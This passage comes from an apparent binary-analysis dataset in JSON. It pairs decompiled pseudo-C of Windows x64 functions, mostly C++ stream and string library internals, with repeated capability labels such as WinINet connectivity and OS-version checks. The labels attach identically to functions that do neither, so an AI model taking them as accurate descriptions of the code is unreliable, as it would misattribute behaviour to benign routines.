                           puVar24 = piVar23 + piVar11[1];\n                                piVar1[2] = piVar12;\n                                piVar11[1] = puVar24;\n                                if (piVar12 < piVar21) {\n                                    iVar6 = *piVar12;\n                                }\n                                else {\n                                    pcVar2 = *(*piVar1 + 0x48);\n                                    *(puVar18 + -0x80) = 0x140092d39;\n                                    iVar6 = (*pcVar2)();\n                                    puVar24 = piVar11[1];\n                                }\n                            }\n                            puVar20 = puVar24 + 1;\n                            if (puVar19 <= puVar20) goto code_r0x000140092d44;\n                            piVar10 = piVar22;\n                        } while (iVar6 != -1);\n                        goto code_r0x000140092dc7;\n                    }\n                }\n                else {\ncode_r0x000140092d44:\n                    if (iVar6 != -1) {\n                        if (iVar6 == in_R9W) {\ncode_r0x000140092c89:\n                            piVar11[1] = puVar20;\n                            if (piVar1[3] <= piVar1[2]) {\n                                pcVar2 = *(*piVar1 + 0x50);\n                                *(puVar18 + -0x80) = 0x140092dde;\n                                (*pcVar2)(piVar1);\n                                goto code_r0x000140092b61;\n                            }\n                            piVar1[2] = piVar1[2] + 2;\n                            if (0 < puVar19) {\n                                *piVar22 = 0;\n                            }\n                            goto joined_r0x000140092cb2;\n                        }\n                        if (0 < puVar19) {\n                            *piVar22 = 0;\n                        }\n                        goto code_r0x000140092b76;\n                    }\ncode_r0x000140092dc7:\n                    puVar24 = piVar11[1];\n                }\ncode_r0x000140092d6e:\n                if (0 < puVar19) {\n                    *piVar22 = 0;\n                }\n                uVar14 = 6;\n                if (puVar24 != NULL) {\n                    uVar14 = 2;\n                }\n            }\n            iVar9 = *(*piVar11 + -0x18) + piVar11;\n            uVar13 = *(iVar9 + 0x20);\n            *(puVar18 + -0x80) = 0x140092b8d;\n            fcn.1400b5480(iVar9, uVar14 | uVar13);\n            return piVar11;\n        }\n        if (uVar7 != 0xffff) {\n            do {\n                piStack152 = 0x1400929ed;\n                cVar5 = (**(*piVar11 + 0x10))(piVar11);\n                if (cVar5 == '\\0') {\n                    piVar22 = *ppiVar15;\n                    iVar9 = ppiVar15 + piVar22[-3];\n                    goto code_r0x00014009294e;\n                }\n                piVar21 = piVar1[2];\n                if (piVar21 < piVar1[3]) {\n                    iVar6 = *piVar21;\n                    piVar1[2] = piVar21 + 1;\n                }\n                else {\n                    piStack152 = 0x140092a04;\n                    iVar6 = (**(*piVar1 + 0x50))(piVar1);\n                }\n                if (iVar6 == -1) break;\n                if (piVar1[2] < piVar1[3]) {\n                    uVar7 = *piVar1[2];\n                }\n                else {\n                    piStack152 = 0x140092a31;\n                    uVar7 = (**(*piVar1 + 0x48))(piVar1);\n                }\n                arg3 = uVar7;\n            } while (uVar7 != 0xffff);\n            piVar22 = *ppiVar15;\n            iVar9 = ppiVar15 + piVar22[-3];\n        }\n        uVar14 = *(iVar9 + 0x20) | 2;\n    }\ncode_r0x000140092955:\n    *0x20 = &stack0xffffffffffffffb8;\n    unaff_RBX = puStack104;\n    unaff_RBP = piStack80;\n    unaff_RSI = puStack96;\n    unaff_RDI = piStack88;\ncode_r0x0001400b5480:\n    uVar13 = uVar14 | 4;\n    if (*(iVar9 + 0xe8) == 0) {\n        uVar13 = uVar14 | 5;\n    }\n    *(iVar9 + 0x20) = uVar13;\n    uVar13 = uVar13 & *(iVar9 + 0x1c);\n    arg2_00 = uVar13;\n    if (uVar13 != 0) {\n        arg1_00 = \"basic_ios::clear\";\n        *(*0x20 + -0x30) = 0x1400b54b1;\n        fcn.1400bd8d0(\"basic_ios::clear\");\n        *(*0x20 + -0x30) = unaff_R12;\n        *(*0x20 + -0x38) = unaff_RBP;\n        *(*0x20 + -0x40) = unaff_RDI;\n        *(*0x20 + -0x48) = unaff_RSI;\n        *(*0x20 + -0x50) = unaff_RBX;\n        *(*0x20 + -0x88) = 0x1400b54df;\n        fcn.1400a59d0(arg1_00, arg2_00 + 0xd0);\n        puVar18 = *0x20 + -0x58;\n        *(*0x20 + -0x88) = 0x1400b54f2;\n        fcn.1400b3230(puVar18, arg2_00, arg3);\n        *(*0x20 + -0x88) = 0x1400b54fa;\n        fcn.1400a5ae0(puVar18);\n        *(*0x20 + -0x88) = 0x1400b5505;\n        fcn.1400b51a0(arg2_00, arg3);\n        piVar22 = *(arg2_00 + 0xe8);\n        if (piVar22 != NULL) {\n            *(*0x20 + -0x88) = 0x1400b5520;\n            fcn.1400a59d0(puVar18, piVar22 + 7);\n            pcVar2 = *(*piVar22 + 0x10);\n            *(*0x20 + -0x88) = 0x1400b552c;\n            (*pcVar2)(piVar22, arg3);\n            *(*0x20 + -0x88) = 0x1400b5537;\n            fcn.1400a5b40(piVar22 + 7, arg3);\n            *(*0x20 + -0x88) = 0x1400b553f;\n            fcn.1400a5ae0(puVar18);\n        }\n        return arg1_00;\n    }\n    return piVar22;\n}\n",
        "token_count": 4960
    },
    "140093a7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.140093a70(int64_t *arg1, ulong arg2)\n\n{\n    int64_t *piVar1;\n    int16_t *piVar2;\n    char cVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    char acStack56 [8];\n    int64_t *piStack48;\n    \n    fcn.1400941a0(acStack56, arg1);\n    if (acStack56[0] != '\\0') {\n        piVar1 = *(arg1 + *(*arg1 + -0x18) + 0xe8);\n        piVar2 = piVar1[5];\n        if (piVar2 < piVar1[6]) {\n            *piVar2 = arg2;\n            piVar1[5] = piVar2 + 1;\n        }\n        else {\n            arg2._0_2_ = (**(*piVar1 + 0x68))();\n        }\n        if (arg2 == -1) {\n            iVar5 = *(*arg1 + -0x18) + arg1;\n            fcn.1400b5480(iVar5, *(iVar5 + 0x20) | 1);\n        }\n    }\n    iVar5 = *(*piStack48 + -0x18);\n    if ((*(piStack48 + iVar5 + 0x19) & 0x20) != 0) {\n        cVar3 = fcn.1400b76c0();\n        if ((cVar3 == '\\0') && (piVar1 = *(piStack48 + iVar5 + 0xe8),  piVar1 != NULL)) {\n            iVar4 = (**(*piVar1 + 0x30))();\n            if (iVar4 == -1) {\n                iVar5 = piStack48 + *(*piStack48 + -0x18);\n                fcn.1400b5480(iVar5, *(iVar5 + 0x20) | 1);\n            }\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 443
    },
    "140093c6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.140093c60(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    char acStack40 [8];\n    int64_t *piStack32;\n    \n    if (*(arg1 + *(*arg1 + -0x18) + 0xe8) != 0) {\n        fcn.1400941a0(acStack40, arg1);\n        if (acStack40[0] != '\\0') {\n            iVar3 = (**(**(arg1 + *(*arg1 + -0x18) + 0xe8) + 0x30))();\n            if (iVar3 == -1) {\n                iVar4 = *(*arg1 + -0x18) + arg1;\n                fcn.1400b5480(iVar4, *(iVar4 + 0x20) | 1);\n            }\n        }\n        iVar4 = *(*piStack32 + -0x18);\n        if ((*(piStack32 + iVar4 + 0x19) & 0x20) != 0) {\n            cVar2 = fcn.1400b76c0();\n            if ((cVar2 == '\\0') && (piVar1 = *(piStack32 + iVar4 + 0xe8),  piVar1 != NULL)) {\n                iVar3 = (**(*piVar1 + 0x30))();\n                if (iVar3 == -1) {\n                    iVar4 = piStack32 + *(*piStack32 + -0x18);\n                    fcn.1400b5480(iVar4, *(iVar4 + 0x20) | 1);\n                }\n            }\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 389
    },
    "1400b6bb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b6bb0(int64_t *arg1, ulong arg2, int64_t *arg3)\n\n{\n    int16_t *piVar1;\n    int64_t iVar2;\n    char cVar3;\n    int16_t iVar4;\n    int16_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int64_t *piVar8;\n    int64_t *arg1_00;\n    int64_t iVar9;\n    int64_t iVar10;\n    int64_t iVar11;\n    char acStack88 [8];\n    int64_t *piStack80;\n    \n    piVar8 = arg1;\n    fcn.1400941a0(acStack88, arg1);\n    if (acStack88[0] == '\\0') goto code_r0x0001400b6cbc;\n    iVar9 = *(*arg1 + -0x18) + arg1;\n    iVar10 = *(iVar9 + 0x10);\n    if (arg3 < iVar10) {\n        uVar6 = *(iVar9 + 0x18) & 0xb0;\n        if (uVar6 != 0x20) {\n            iVar11 = iVar10 - arg3;\n            if (*(iVar9 + 0xe2) != '\\0') {\n                iVar5 = *(iVar9 + 0xe0);\ncode_r0x0001400b6c5f:\n                do {\n                    piVar8 = *(iVar9 + 0xe8);\n                    piVar1 = piVar8[5];\n                    if (piVar1 < piVar8[6]) {\n                        *piVar1 = iVar5;\n                        piVar8[5] = piVar1 + 1;\n                        iVar4 = iVar5;\n                    }\n                    else {\n                        iVar4 = (**(*piVar8 + 0x68))(piVar8, iVar5);\n                        iVar9 = *(*arg1 + -0x18) + arg1;\n                    }\n                    if (iVar4 == -1) {\n                        fcn.1400b5480(iVar9, *(iVar9 + 0x20) | 1);\n                        iVar9 = *(*arg1 + -0x18) + arg1;\n                        goto code_r0x0001400b6ca8;\n                    }\n                    iVar11 = iVar11 + -1;\n                } while (iVar11 != 0);\n                iVar7 = *(iVar9 + 0x20);\n                goto joined_r0x0001400b6d65;\n            }\n            if (*(iVar9 + 0xf0) != NULL) {\n                iVar5 = (**(**(iVar9 + 0xf0) + 0x50))();\n                *(iVar9 + 0xe0) = iVar5;\n                iVar2 = *arg1;\n                *(iVar9 + 0xe2) = 1;\n                iVar9 = *(iVar2 + -0x18) + arg1;\n                goto code_r0x0001400b6c5f;\n            }\n            fcn.1400bd1f0();\ncode_r0x0001400b6ed8:\n            arg1_00 = fcn.1400bd1f0();\n            if (piVar8 == 0x1) {\n                fcn.1400bc860(arg1_00);\n                arg1 = arg1 + *(*arg1 + -0x18);\n                arg1_00 = arg1;\n                fcn.1400b5180(arg1, 1);\n                fcn.1400bcd60();\n            }\n            fcn.1400bc860(arg1_00);\n            fcn.1400b5180(*(*arg1 + -0x18) + arg1, 1);\n            fcn.1400bca40();\n            goto code_r0x0001400b6cbc;\n        }\ncode_r0x0001400b6ca8:\n        iVar7 = *(iVar9 + 0x20);\njoined_r0x0001400b6d65:\n        if (iVar7 == 0) {\n            piVar8 = (**(**(iVar9 + 0xe8) + 0x60))(*(iVar9 + 0xe8), arg2, arg3);\n            iVar9 = *arg1;\n            if (arg3 != piVar8) {\n                iVar9 = *(iVar9 + -0x18) + arg1;\n                piVar8 = *(iVar9 + 0x20) | 1;\n                fcn.1400b5480(iVar9, piVar8);\n                iVar9 = *arg1;\n            }\n            iVar9 = *(iVar9 + -0x18) + arg1;\n            if ((uVar6 == 0x20) && (*(iVar9 + 0x20) == 0)) {\n                iVar10 = iVar10 - arg3;\n                if (*(iVar9 + 0xe2) == '\\0') {\n                    if (*(iVar9 + 0xf0) == NULL) goto code_r0x0001400b6ed8;\n                    iVar5 = (**(**(iVar9 + 0xf0) + 0x50))();\n                    *(iVar9 + 0xe0) = iVar5;\n                    iVar11 = *arg1;\n                    *(iVar9 + 0xe2) = 1;\n                    iVar9 = *(iVar11 + -0x18) + arg1;\n                }\n                else {\n                    iVar5 = *(iVar9 + 0xe0);\n                }\n                do {\n                    piVar8 = *(iVar9 + 0xe8);\n                    piVar1 = piVar8[5];\n                    if (piVar1 < piVar8[6]) {\n                        *piVar1 = iVar5;\n                        piVar8[5] = piVar1 + 1;\n                        iVar4 = iVar5;\n                    }\n                    else {\n                        iVar4 = (**(*piVar8 + 0x68))(piVar8, iVar5);\n                        iVar9 = *(*arg1 + -0x18) + arg1;\n                    }\n                    if (iVar4 == -1) {\n                        fcn.1400b5480(iVar9, *(iVar9 + 0x20) | 1);\n                        goto code_r0x0001400b6d41;\n                    }\n                    iVar10 = iVar10 + -1;\n                } while (iVar10 != 0);\n            }\n        }\n    }\n    else {\n        piVar8 = (**(**(iVar9 + 0xe8) + 0x60))(*(iVar9 + 0xe8), arg2, arg3);\n        iVar9 = *(*arg1 + -0x18) + arg1;\n        if (arg3 != piVar8) {\n            fcn.1400b5480(iVar9, *(iVar9 + 0x20) | 1);\ncode_r0x0001400b6d41:\n            *(arg1 + *(*arg1 + -0x18) + 0x10) = 0;\n            goto code_r0x0001400b6cbc;\n        }\n    }\n    *(iVar9 + 0x10) = 0;\ncode_r0x0001400b6cbc:\n    iVar10 = *(*piStack80 + -0x18);\n    if (((((*(piStack80 + iVar10 + 0x19) & 0x20) != 0) && (cVar3 = fcn.1400b76c0(),  cVar3 == '\\0')) &&\n        (piVar8 = *(piStack80 + iVar10 + 0xe8),  piVar8 != NULL)) && (iVar7 = (**(*piVar8 + 0x30))(),  iVar7 == -1)) {\n        iVar10 = piStack80 + *(*piStack80 + -0x18);\n        fcn.1400b5480(iVar10, *(iVar10 + 0x20) | 1);\n    }\n    return arg1;\n}\n",
        "token_count": 1735
    },
    "1400948e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.1400948e0(int64_t *arg1)\n\n{\n    unkbyte10 Var1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    char cVar4;\n    ushort uVar5;\n    int32_t iVar6;\n    int64_t *piVar7;\n    unkbyte10 *in_RDX;\n    int64_t *piVar8;\n    int64_t iVar9;\n    unkbyte10 Stack104;\n    int64_t iStack88;\n    uint64_t uStack80;\n    uchar auStack72 [8];\n    char cStack64;\n    char acStack56 [8];\n    int64_t *piStack48;\n    \n    Var1 = *in_RDX;\n    piVar8 = arg1;\n    fcn.1400941a0(acStack56, arg1);\n    if (acStack56[0] == '\\0') goto code_r0x0001400949a5;\n    iVar9 = *(*arg1 + -0x18) + arg1;\n    piVar7 = *(iVar9 + 0xf8);\n    if (piVar7 == NULL) {\n        fcn.1400bd1f0();\ncode_r0x000140094a44:\n        piVar7 = fcn.1400bd1f0();\n        if (piVar8 == 0x1) {\n            fcn.1400bc860(piVar7);\n            fcn.1400b5180(arg1 + *(*arg1 + -0x18), 1);\n            arg1 = fcn.1400bcd60();\n            fcn.1400942a0(acStack56);\n            piVar7 = arg1;\n            fcn.140014f30(arg1);\n        }\n        fcn.1400bc860(piVar7);\n        fcn.1400b5180(*(*arg1 + -0x18) + arg1, 1);\n        fcn.1400bca40();\n    }\n    else {\n        if (*(iVar9 + 0xe2) == '\\0') {\n            piVar2 = *(iVar9 + 0xf0);\n            if (piVar2 == NULL) goto code_r0x000140094a44;\n            uVar5 = (**(*piVar2 + 0x50))(piVar2, 0x20);\n            iVar3 = *arg1;\n            *(iVar9 + 0xe0) = uVar5;\n            *(iVar9 + 0xe2) = 1;\n            iVar9 = *(iVar3 + -0x18) + arg1;\n        }\n        else {\n            uVar5 = *(iVar9 + 0xe0);\n        }\n        iStack88 = *(iVar9 + 0xe8);\n        uStack80 = iStack88 == 0;\n        Stack104 = Var1;\n        (**(*piVar7 + 0x40))(auStack72, piVar7, &iStack88, iVar9, uVar5, &Stack104);\n        if (cStack64 != '\\0') {\n            iVar9 = *(*arg1 + -0x18) + arg1;\n            fcn.1400b5480(iVar9, *(iVar9 + 0x20) | 1);\n        }\n    }\ncode_r0x0001400949a5:\n    iVar9 = *(*piStack48 + -0x18);\n    if ((*(piStack48 + iVar9 + 0x19) & 0x20) != 0) {\n        cVar4 = fcn.1400b76c0();\n        if ((cVar4 == '\\0') && (piVar8 = *(piStack48 + iVar9 + 0xe8),  piVar8 != NULL)) {\n            iVar6 = (**(*piVar8 + 0x30))();\n            if (iVar6 == -1) {\n                iVar9 = piStack48 + *(*piStack48 + -0x18);\n                fcn.1400b5480(iVar9, *(iVar9 + 0x20) | 1);\n            }\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 898
    },
    "14009d83": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.14009d830(int64_t arg1, ulong arg2)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint *puVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    bool bVar9;\n    uchar uVar10;\n    int64_t *piVar11;\n    char *arg2_00;\n    ulong uVar12;\n    ulong uVar13;\n    int64_t iVar14;\n    int64_t iStack96;\n    int64_t iStack88;\n    int64_t aiStack80 [2];\n    \n    piVar11 = fcn.1400b9c70(arg2);\n    if (*(*piVar11 + 0x20) == 0x140060f40) {\n        iVar14 = -1;\n        iVar4 = *(piVar11[2] + 0x10);\n        if (iVar4 != 0) {\n            iVar14 = sub.msvcrt.dll_strlen(iVar4);\n            iVar14 = iVar4 + iVar14;\n        }\n        iStack96 = fcn.14007ba60(iVar4, iVar14);\n    }\n    else {\n        (**(*piVar11 + 0x20))(&iStack96, piVar11);\n    }\n    uVar12 = *(iStack96 + -0x18);\n    *(arg1 + 0x18) = uVar12;\n    arg2_00 = fcn.1400bc6e0(uVar12);\n    fcn.140024ea0(&iStack96, arg2_00, *(arg1 + 0x18), 0);\n    bVar9 = false;\n    if (*(arg1 + 0x18) != 0) {\n        bVar9 = *arg2_00 - 1U < 0x7e;\n    }\n    *(arg1 + 0x20) = bVar9;\n    if (*(*piVar11 + 0x28) == 0x140060f90) {\n        iVar14 = -1;\n        iVar4 = *(piVar11[2] + 0x28);\n        if (iVar4 != 0) {\n            iVar14 = sub.msvcrt.dll_strlen(iVar4);\n            iVar14 = iVar4 + iVar14;\n        }\n        iStack88 = fcn.14007ba60(iVar4, iVar14);\n    }\n    else {\n        (**(*piVar11 + 0x28))(&iStack88, piVar11);\n    }\n    uVar12 = *(iStack88 + -0x18);\n    *(arg1 + 0x30) = uVar12;\n    uVar12 = fcn.1400bc6e0(uVar12);\n    fcn.140024ea0(&iStack88, uVar12, *(arg1 + 0x30), 0);\n    if (*(*piVar11 + 0x30) == 0x140060fe0) {\n        iVar14 = -1;\n        iVar4 = *(piVar11[2] + 0x38);\n        if (iVar4 != 0) {\n            iVar14 = sub.msvcrt.dll_strlen(iVar4);\n            iVar14 = iVar4 + iVar14;\n        }\n        aiStack80[0] = fcn.14007ba60(iVar4, iVar14);\n    }\n    else {\n        (**(*piVar11 + 0x30))(aiStack80, piVar11);\n    }\n    uVar13 = *(aiStack80[0] + -0x18);\n    *(arg1 + 0x40) = uVar13;\n    uVar13 = fcn.1400bc6e0(uVar13);\n    fcn.140024ea0(aiStack80, uVar13, *(arg1 + 0x40), 0);\n    if (*(*piVar11 + 0x10) == 0x140061090) {\n        uVar10 = *(piVar11[2] + 0x48);\n    }\n    else {\n        uVar10 = (**(*piVar11 + 0x10))(piVar11);\n    }\n    *(arg1 + 0x48) = uVar10;\n    if (*(*piVar11 + 0x18) == 0x1400610a0) {\n        uVar10 = *(piVar11[2] + 0x49);\n    }\n    else {\n        uVar10 = (**(*piVar11 + 0x18))(piVar11);\n    }\n    *(arg1 + 0x49) = uVar10;\n    piVar11 = fcn.1400b97f0(arg2);\n    puVar5 = **0x14010fdc0;\n    if (*(piVar11 + 7) == '\\x01') {\n        uVar6 = puVar5[1];\n        uVar7 = puVar5[2];\n        uVar8 = puVar5[3];\n        *(arg1 + 0x4a) = *puVar5;\n        *(arg1 + 0x4e) = uVar6;\n        *(arg1 + 0x52) = uVar7;\n        *(arg1 + 0x56) = uVar8;\n        uVar6 = puVar5[5];\n        uVar7 = puVar5[6];\n        uVar8 = puVar5[7];\n        *(arg1 + 0x5a) = puVar5[4];\n        *(arg1 + 0x5e) = uVar6;\n        *(arg1 + 0x62) = uVar7;\n        *(arg1 + 0x66) = uVar8;\n        *(arg1 + 0x6a) = puVar5[8];\n    }\n    else {\n        if (*(piVar11 + 7) == '\\0') {\n            fcn.14002b2c0(piVar11);\n        }\n        if (*(*piVar11 + 0x38) == 0x14002ba80) {\n            uVar6 = puVar5[1];\n            uVar7 = puVar5[2];\n            uVar8 = puVar5[3];\n            *(arg1 + 0x4a) = *puVar5;\n            *(arg1 + 0x4e) = uVar6;\n            *(arg1 + 0x52) = uVar7;\n            *(arg1 + 0x56) = uVar8;\n            uVar6 = puVar5[5];\n            uVar7 = puVar5[6];\n            uVar8 = puVar5[7];\n            *(arg1 + 0x5a) = puVar5[4];\n            *(arg1 + 0x5e) = uVar6;\n            *(arg1 + 0x62) = uVar7;\n            *(arg1 + 0x66) = uVar8;\n            *(arg1 + 0x6a) = puVar5[8];\n        }\n        else {\n            (**(*piVar11 + 0x38))(piVar11, puVar5, puVar5 + 9, arg1 + 0x4a);\n        }\n    }\n    puVar5 = **0x14010fdb0;\n    if (*(piVar11 + 7) == '\\x01') {\n        uVar6 = puVar5[1];\n        uVar7 = puVar5[2];\n        uVar8 = puVar5[3];\n        *(arg1 + 0x6e) = *puVar5;\n        *(arg1 + 0x72) = uVar6;\n        *(arg1 + 0x76) = uVar7;\n        *(arg1 + 0x7a) = uVar8;\n        uVar6 = *(puVar5 + 0xe);\n        uVar7 = *(puVar5 + 0x12);\n        uVar8 = *(puVar5 + 0x16);\n        *(arg1 + 0x78) = *(puVar5 + 10);\n        *(arg1 + 0x7c) = uVar6;\n        *(arg1 + 0x80) = uVar7;\n        *(arg1 + 0x84) = uVar8;\n    }\n    else {\n        if (*(piVar11 + 7) == '\\0') {\n            fcn.14002b2c0(piVar11);\n        }\n        if (*(*piVar11 + 0x38) == 0x14002ba80) {\n            uVar6 = puVar5[1];\n            uVar7 = puVar5[2];\n            uVar8 = puVar5[3];\n            *(arg1 + 0x6e) = *puVar5;\n            *(arg1 + 0x72) = uVar6;\n            *(arg1 + 0x76) = uVar7;\n            *(arg1 + 0x7a) = uVar8;\n            uVar6 = *(puVar5 + 0xe);\n            uVar7 = *(puVar5 + 0x12);\n            uVar8 = *(puVar5 + 0x16);\n            *(arg1 + 0x78) = *(puVar5 + 10);\n            *(arg1 + 0x7c) = uVar6;\n            *(arg1 + 0x80) = uVar7;\n            *(arg1 + 0x84) = uVar8;\n        }\n        else {\n            (**(*piVar11 + 0x38))(piVar11, puVar5, puVar5 + 0x1a, arg1 + 0x6e);\n        }\n    }\n    *(arg1 + 0x10) = arg2_00;\n    *(arg1 + 0x28) = uVar12;\n    *(arg1 + 0x38) = uVar13;\n    *(arg1 + 0x88) = 1;\n    piVar2 = *0x14010fc90;\n    if (**0x14010fc90 == 0) {\n        iVar3 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.14007bf10(aiStack80[0] + -0x18);\n        iVar3 = *piVar2;\n    }\n    else {\n        iVar3 = *piVar2;\n    }\n    if (iVar3 == 0) {\n        iVar3 = *(iStack88 + -8);\n        *(iStack88 + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iStack88 + -8;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.14007bf10(iStack88 + -0x18);\n        iVar3 = *piVar2;\n    }\n    else {\n        iVar3 = *piVar2;\n    }\n    if (iVar3 == 0) {\n        iVar3 = *(iStack96 + -8);\n        *(iStack96 + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar2 = iStack96 + -8;\n        iVar3 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.14007bf10(iStack96 + -0x18, aiStack80);\n    }\n    return;\n}\n",
        "token_count": 2620
    },
    "14009de5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.14009de50(ulong *arg1)\n\n{\n    *arg1 = 0x1401185e0;\n    if (*(arg1 + 0x11) != '\\0') {\n        if (arg1[2] != 0) {\n            fcn.1400bc6b0();\n        }\n        if (arg1[5] != 0) {\n            fcn.1400bc6b0();\n        }\n        if (arg1[7] != 0) {\n            fcn.1400bc6b0();\n        }\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "14009df1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00014009e2fc)\n\nvoid fcn.14009df10(int64_t arg1, ulong arg2)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    int64_t arg1_00;\n    bool bVar5;\n    ushort uVar6;\n    int64_t *piVar7;\n    char *arg2_00;\n    ulong uVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    int64_t iStack80;\n    int64_t iStack72;\n    int64_t iStack64;\n    \n    piVar7 = fcn.1400b9cd0(arg2);\n    if (*(*piVar7 + 0x20) == 0x140061200) {\n        iVar9 = -1;\n        iVar10 = *(piVar7[2] + 0x10);\n        if (iVar10 != 0) {\n            iVar9 = sub.msvcrt.dll_strlen(iVar10);\n            iVar9 = iVar10 + iVar9;\n        }\n        iStack80 = fcn.14007bae0(iVar10, iVar9);\n    }\n    else {\n        (**(*piVar7 + 0x20))(&iStack80, piVar7);\n    }\n    uVar8 = *(iStack80 + -0x18);\n    *(arg1 + 0x18) = uVar8;\n    arg2_00 = fcn.1400bc6e0(uVar8);\n    fcn.140024ea0(&iStack80, arg2_00, *(arg1 + 0x18), 0);\n    bVar5 = false;\n    if (*(arg1 + 0x18) != 0) {\n        bVar5 = *arg2_00 - 1U < 0x7e;\n    }\n    *(arg1 + 0x20) = bVar5;\n    if (*(*piVar7 + 0x28) == 0x140061250) {\n        iVar9 = -2;\n        iVar10 = *(piVar7[2] + 0x28);\n        if (iVar10 != 0) {\n            iVar9 = sub.msvcrt.dll_wcslen(iVar10);\n            iVar9 = iVar10 + iVar9 * 2;\n        }\n        iStack72 = fcn.1400725d0(iVar10, iVar9);\n    }\n    else {\n        (**(*piVar7 + 0x28))(&iStack72, piVar7);\n    }\n    uVar4 = *(iStack72 + -0x18);\n    *(arg1 + 0x30) = uVar4;\n    if (0x3ffffffffffffffc < uVar4) {\n        uVar8 = fcn.1400bd850();\n        iVar9 = 0;\n        goto code_r0x00014009e2c2;\n    }\n    iVar9 = fcn.1400bc6e0(uVar4 * 2);\n    fcn.140023e10(&iStack72, iVar9, *(arg1 + 0x30), 0);\n    if (*(*piVar7 + 0x30) == 0x1400612a0) {\n        iVar10 = -2;\n        arg1_00 = *(piVar7[2] + 0x38);\n        if (arg1_00 != 0) {\n            iVar10 = sub.msvcrt.dll_wcslen(arg1_00);\n            iVar10 = arg1_00 + iVar10 * 2;\n        }\n        iStack64 = fcn.1400725d0(arg1_00, iVar10);\n    }\n    else {\n        (**(*piVar7 + 0x30))(&iStack64, piVar7);\n    }\n    uVar4 = *(iStack64 + -0x18);\n    *(arg1 + 0x40) = uVar4;\n    if (0x3ffffffffffffffc < uVar4) {\n        uVar8 = fcn.1400bd850();\n        do {\n            fcn.140072a20(iStack72 + -0x18);\ncode_r0x00014009e2c2:\n            fcn.14007bf20(iStack80 + -0x18);\n            fcn.1400bc860(uVar8);\n            if (arg2_00 != NULL) {\n                fcn.1400bc6b0(arg2_00);\n            }\n            if (iVar9 != 0) {\n                fcn.1400bc6b0(iVar9);\n            }\n            uVar8 = 